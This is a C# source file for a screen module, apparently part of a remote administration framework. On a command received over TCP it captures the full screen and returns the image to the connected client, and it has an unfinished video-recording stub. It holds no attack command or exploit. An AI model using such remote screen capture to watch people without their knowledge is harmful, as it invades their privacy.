using LannLogger;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using ScreenModule.Structures;
using Serilog.Core;
using SystemModule.Structures;

namespace ScreenModule;

[Module("screen")]
public class ScreenModuleImpl : IModule {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("Module", "Screen");

    public static TForm Form1 { get; } = new();
    private readonly Thread thread;

    private ScreenModuleImpl() {
        thread = new Thread(TForm.RunnerThread);
        thread.Start();
    }

    public void Dispose() {
        thread.Interrupt();
    }

    [Handler("takeScreenshot")]
    public async Task TakeScreenshot(TCPClient client, EmptyHandlerData data) {
        Rectangle rect = Screen.GetDimensions();

        Logger.Information("Taking screenshot, dimensions: {X}:{Y}",
            rect.Width,
            rect.Height);

        TakeScreenshotResult result = new();
        try {
            using Bitmap bmp = GDICapture.CaptureRegion(rect);
            using MemoryStream stream = bmp.ToMemoryStream();

            result.Data = stream.ToArray();
            result.Success = true;

            Logger.Information("Took screenshot, size: {Bytes} bytes", result.Data.Length);
        } catch (Exception error) {
            Logger.Error("Failed to take screenshot: {Error}", error);
            result.Success = false;
            result.Error = error.Message;
        }

        await Callback(client, "takeScreenshot", result);
    }

    [Handler("recordVideo")]
    public async Task RecordVideo(TCPClient client, EmptyHandlerData data) {
        //string file = await Recorder.Record(25, 1000 * 10);
    }
}